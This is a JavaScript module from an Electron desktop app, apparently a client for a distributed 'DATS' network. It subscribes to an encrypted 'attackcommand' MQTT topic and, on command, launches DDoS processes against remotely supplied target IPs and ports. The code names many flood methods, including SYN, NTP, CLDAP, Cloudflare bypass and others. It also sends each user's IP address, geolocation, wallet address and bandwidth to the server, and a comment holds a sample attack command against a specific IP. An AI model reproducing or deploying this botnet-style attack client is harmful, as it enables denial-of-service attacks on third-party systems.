const { app } = require('electron');
const mqtt = require('mqtt');
const schedule = require('node-schedule');
const moment = require('moment');
const crypto = require('./crypto.js');
const store = require('./store.js');
const log = require('./log.js');
const wsl = require('./wsl.js');
const rest = require('./restService.js');
const speedTest = require('./speedTest.js');
const { currentPlatform } = require('./os.js');
const childProcess = require('./childProcess.js');
const psTree = require('ps-tree');

const appMainWindow = require('../main-window');

require('dotenv').config();

store.set("onAttack", false);

const l4 = ['TCP', 'UDP', 'SYN', 'CPS', 'ICMP', 'CONNECTION', 'VSE', 'TS3', 'FIVEM', 'MEM', 'NTP', 'MCBOT', 'MINECRAFT', 'MCPE', 'DNS', 'CHAR', 'CLDAP', 'ARD', 'RDP'];
const l7 = ['GET', 'POST', 'OVH', 'RHEX', 'STOMP', 'STRESS', 'DYN', 'DOWNLOADER', 'SLOW', 'HEAD', 'NULL', 'COOKIE', 'PPS', 'EVEN', 'GSB', 'DGB', 'AVB', 'BOT', 'APACHE', 'XMLRPC', 'CFB', 'CFBUAM', 'BYPASS', 'BOMB', 'KILLER', 'TOR'];

let client = null;
let speedTestJob = null;

const options = {
    keepalive: 60,
    //clientId: clientId,
    protocolId: 'MQTT',
    protocolVersion: 4,
    clean: true,
    reconnectPeriod: 1000,
    connectTimeout: 30 * 1000,
    will: {
        topic: 'WillMsg',
        payload: 'Connection Closed abnormally..!',
        qos: 0,
        retain: false
    },
    username: '',
    password: ''
}

const topic = 'attackcommand';

const onConnectMqtt = (clientId) => {


    let datsWatcher = undefined;
    let datsSniffer = undefined;
    let ddosProcess = undefined;

    if (client != null) {
        onDisconnectMqtt();
    }

    let { externalIpAddress, geolocation } = store.get('user_geolocation');

    let attackStartTimestamp = null;
    let attackEndTimestamp = null;

    // console.log(externalIpAddress);
    // console.log(geolocation);

    const host = 'ws://emqx-client.datsproject.io/mqtt';
    options.clientId = clientId;
    options.username = clientId;

    const key = Buffer.from(store.get("aes_key"), "base64");
    const iv = Buffer.from(store.get("aes_iv"), "base64");

    options.password = crypto.encryptMsg(clientId, key, iv);

    console.log('Connecting mqtt client...');
    client = mqtt.connect(host, options);

    client.on('error', (err) => {
        console.log('Connection error: ', err);
        //client.end()
    });

    client.on('reconnect', () => {
        console.log(`Reconnecting...`);
        //log.logInfo('Emqx reconnecting...');

        onSubscribeMqtt('attackcommand', 0);
        onSubscribeMqtt('userdatacollector', 0);

        if (speedTestJob) {
            speedTestJob.cancel();
        }
    });

    client.on('connect', async() => {
        console.log('Client connected:' + clientId);
        log.logInfo(`Emqx cliented connected. clientId: ${clientId}`);

        if (speedTestJob) {
            speedTestJob.cancel();
        }

        /*
        const sDate = moment('17/01/2023 23:00:15', 'DD/MM/YYYY hh:mm:ss');
        console.log('now time: ', moment());
        console.log('start time: ', sDate.toDate());
        console.log('start time unix date: ', sDate.unix());
        console.log('start time add 50 seconds: ', sDate.add(50, 'seconds').toDate());
        */

        // Subscribe
        //onSubscribeMqtt(`${options.clientId}/startattack`, 0);
        //if (process.platform !== 'darwin') onSubscribeMqtt('attackcommand', 0);
        onSubscribeMqtt('attackcommand', 0);
        onSubscribeMqtt('userdatacollector', 0);

        const datsDistroVersion = "" //process.platform !== 'darwin' ? await wsl.getDatsDistroVersion() : "";

        speedTestJob = schedule.scheduleJob("0/5 * * * *", async() => {
            if (client.connected && !store.get("onAttack")) {
                try {
                    const speedTestResult = await speedTest.runSpeedTest();
                    //console.log(speedTestResult);

                    const testDate = await rest.getTimeNow();
                    const speedTestJson = JSON.parse(speedTestResult);
                    console.log('upload speed: ', parseInt(speedTestJson.upload));

                    const publishObj = {
                        walletAddress: clientId,
                        bandWidth: parseInt(speedTestJson.upload), //bps
                        ipAddress: externalIpAddress,
                        onAttack: false,
                        attackId: "",
                        attackTargetIp: "",
                        geoLocation: {
                            latitude: geolocation.latitude,
                            longitude: geolocation.longitude,
                            city: geolocation.city,
                            country: geolocation.country_name,
                            countryCode: geolocation.country_code
                        },
                        appVersion: app.getVersion(),
                        distroVersion: datsDistroVersion,
                        osVersion: currentPlatform.toLowerCase(),
                        createdAt: testDate
                    }

                    //console.log(publishObj);
                    onSendMqtt('userdatacollector', 0, JSON.stringify(publishObj));
                    //log.logInfo(`Sended speed test data: ${JSON.stringify(publishObj)}`);
                    log.logInfo(`Sended speed test data: walletAddress: ${publishObj.walletAddress}, bandwidth: ${publishObj.bandWidth}`);

                } catch (error) {
                    log.logError(`speed test error. ${error.message}`)
                }
            }
        });
    });

    // Received
    client.on('message', async(topic, message) => {

        if (topic != 'attackcommand') return false;

        console.log('Received Message: ' + message.toString() + '\nOn topic: ' + topic);

        const aes_key = Buffer.from(store.get("aes_key"), "base64");
        const aes_iv = Buffer.from(store.get("aes_iv"), "base64");

        let decryptedMessage = null;

        try {
            decryptedMessage = crypto.decryptMsg(message.toString(), aes_key, aes_iv);
        } catch (error) {
            log.logError(`Invalid attack message format. ${error.message}`);
            return false;
        }

        //console.log(`Decrypted message: ${decryptedMessage}`);

        const ddosData = JSON.parse(decryptedMessage);
        //console.log(ddosData);

        let duration = 0;
        const attackId = ddosData.id;

        const actuatorUser = ddosData.actuatorUsers.find((user) => user.walletAddress == clientId);

        if (!actuatorUser) {
            return false;
        }

        //console.log(`actuatorUser: ${actuatorUser.walletAddress}, ${actuatorUser.attackOptions}, ${actuatorUser ? true: false}`);

        const socksType = 0;
        const proxyList = 'proxy.txt';
        const ratePerSeconds = 100;

        if (ddosData.type == "start" && store.get("onAttack") == false && actuatorUser.walletAddress == clientId) {

            let params = []; //['tcp', '54.171.59.222:31036', '1', '60', 'true'];

            /**/
            try {
                attackStartTimestamp = await rest.getTimeNow();

                store.set("onAttack", true);
                //store.set("isStop", false);

                log.logInfo(`ATTACK STARTED, ID: ${ddosData.id}`);

                const datsDistroVersion = ""; //await wsl.getDatsDistroVersion();

                const publishObj = {
                    walletAddress: clientId,
                    bandWidth: null,
                    ipAddress: externalIpAddress,
                    onAttack: true,
                    attackId: ddosData.id,
                    attackTargetIp: ddosData.attackTargetIp,
                    geoLocation: {
                        latitude: geolocation.latitude,
                        longitude: geolocation.longitude,
                        city: geolocation.city,
                        country: geolocation.country_name,
                        countryCode: geolocation.country_code
                    },
                    appVersion: app.getVersion(),
                    distroVersion: datsDistroVersion,
                    osVersion: currentPlatform.toLowerCase(),
                    createdAt: attackStartTimestamp
                }

                const ip = ddosData.attackTargetIp;
                const port = ddosData.attackPort;
                duration = parseInt(ddosData.attackDuration);
                //const interfaceName = 'eth0';
                // const configAttackId = `attackId="${attackId}";`;
                // console.log('configAttackId: ', configAttackId);

                let configOptions = `${actuatorUser.attackOptions}`;
                //console.log('configOptions: ', configOptions);

                if (l4.includes(ddosData.attackType)) {
                    configOptions = configOptions.replace('thread_size', '100').replace(".\\start.exe", "");
                } else if (l7.includes(ddosData.attackType)) {
                    configOptions = configOptions.replace('thread_size', `${socksType} 100 ${proxyList} ${ratePerSeconds}`).replace(".\\start.exe", "");
                } else {
                    return false;
                }



                const datsSnifferParams = ['-ip', ip, '-p', port, '-a', attackId, '-t', duration];
                datsSniffer = await childProcess.executeDatsSnifferProcess(datsSnifferParams); //await wsl.runDatsSniffer(ip, port, attackId, duration);
                //console.log(`datssniffer pid: ${datsSniffer.pid}`);

                // const datsWatcher = await wsl.runDatsWatcher(interfaceName, attackId, duration);
                // console.log(`datswatcher pid: ${datsWatcher.pid}`);

                params = configOptions.split(' ');
                params.shift();
                //console.log('params: ', params);

                ddosProcess = await childProcess.executeDDosProcess(params);
                //console.log(`ddos process pid: ${ddosProcess.pid}`)

                // const datsHping = await wsl.runDatsHping(configAttackId, configOptions);
                // console.log(`dats hping pid: ${datsHping.pid}`);

                // const streamDatsWatcher = await wsl.streamDatsWatcherLog(publishObj, onSendMqtt)
                // console.log(`stream dats watcher pid: ${streamDatsWatcher.pid}`);

            } catch (error) {
                console.log(`Attack start error >> ${error.message}`);
                log.logError(`Attack start error >> ${error.message}`);
                store.set("onAttack", false);
            }

        }

        if (ddosData.type == "stop" && store.get("onAttack") == true && actuatorUser.walletAddress == clientId) {

            /**/
            try {

                if (store.get("onAttack")) {

                    //await wsl.killTailProcess();
                    //await wsl.killDatsProcess();
                    killPsTree(ddosProcess.pid);

                    attackEndTimestamp = await rest.getTimeNow();

                    //console.log(`AttackStartTimestamp: ${attackStartTimestamp}`);
                    //console.log(`AttackEndTimestamp: ${attackEndTimestamp}`);

                    const startDate = moment(attackStartTimestamp);
                    const endDate = moment(attackEndTimestamp);

                    const stopDuration = endDate.diff(startDate, 'seconds');
                    //console.log(`duration: ${parseInt(ddosData.attackDuration)}`);
                    //console.log(`stopDuration: ${stopDuration}`);

                    await delay((Math.abs(parseInt(ddosData.attackDuration) - stopDuration) + 15) * 1000);

                    const snifferOutput = await childProcess.readDatsSnifferLog(); //await wsl.readDatsSnifferOutput();
                    //log.logInfo(`sniffer output: ${snifferOutput}`);

                    if (snifferOutput.trim().length == 0) throw new Error('Invalid sniffer output.');

                    const snifferData = JSON.parse(snifferOutput);
                    const postObj = {
                        walletAddress: clientId,
                        items: [{
                            attackId: snifferData.attack_id,
                            attackStartTime: attackStartTimestamp,
                            attackEndTime: attackEndTimestamp,
                            totalPacketSent: snifferData.packet_count,
                            totalPacketSizeSent: snifferData.packet_size
                        }]
                    }

                    //console.log(`Packet count obj: ${JSON.stringify(postObj)}`);

                    const sendPacketStatus = await rest.sendPacketCountData(JSON.stringify(postObj));
                    if (sendPacketStatus == 200) {
                        console.log("Total packet count sent successfully.");
                        log.logInfo(`ATTACK STOPPED. ID: ${attackId}`);
                        store.set("onAttack", false);
                    }

                }

            } catch (error) {
                store.set("onAttack", false);
                console.log(`Attack stop error >> ${error.message}`);
                log.logError(`Attack stop error >> ${error.message}`);
            }

        }
    });
}

const delay = (time) => {
    return new Promise((resolve, reject) => {
        const timeoutId = setTimeout(() => {
            resolve(timeoutId);
        }, time);
    });
}



const onDisconnectMqtt = () => {
    if (client.connected) {
        client.end()
        client.on('close', () => {
            console.log(options.clientId + ' disconnected')
            log.logInfo(`${options.clientId} emqx disconnected.`);

            speedTestJob.cancel();

        })
        client = null;
    }
}

const onSubscribeMqtt = (topic, qos) => {
    if (client.connected) {
        client.subscribe(topic, { qos: parseInt(qos, 10) }, (error, res) => {
            if (error) {
                console.error('Subscribe error: ', error);
                log.logError(`Client subscribe error on emqx: ${error}`);
            } else {
                console.log('Subscribed: ', res)
                log.logInfo(`Client subscribed on emqx: ${JSON.stringify(res)}`);
            }
        })
    }
}


const onUnsubscribeMqtt = (topic) => {
    if (client.connected) {
        client.unsubscribe(topic, error => {
            if (error) {
                console.error('Unsubscribe error: ', error);
                log.logError(`Client unsubscribe error on emqx: ${error}`);
            } else {
                console.log('Unsubscribed: ', topic.value);
                log.logInfo(`Client unsubscribed on emqx: ${topic.value}`);
            }
        })
    }
}

const onSendMqtt = (topic, qos, payload) => {
    if (client.connected) {
        client.publish(topic, payload, {
            qos: parseInt(qos, 10),
            retain: false
        })
    }
}

const killPsTree = (pid) => {
    const childProcesses = [];
    psTree(pid, (error, children) => {
        if (error) {
            console.error(`ps-tree error: ${error}`);
            return;
        }

        children.forEach(prc => childProcesses.push(prc.PID));
        childProcesses.forEach(pid => process.kill(pid, 'SIGTERM'));
    });
}

const addSeconds = (date, seconds) => {
    date.setSeconds(date.getSeconds() + seconds);
    return new Date(date);
}

// python3 start.py TCP 138.128.240.5:22 500 10

module.exports = {
    onConnectMqtt,
    onDisconnectMqtt,
    onSubscribeMqtt,
    onUnsubscribeMqtt,
    onSendMqtt
}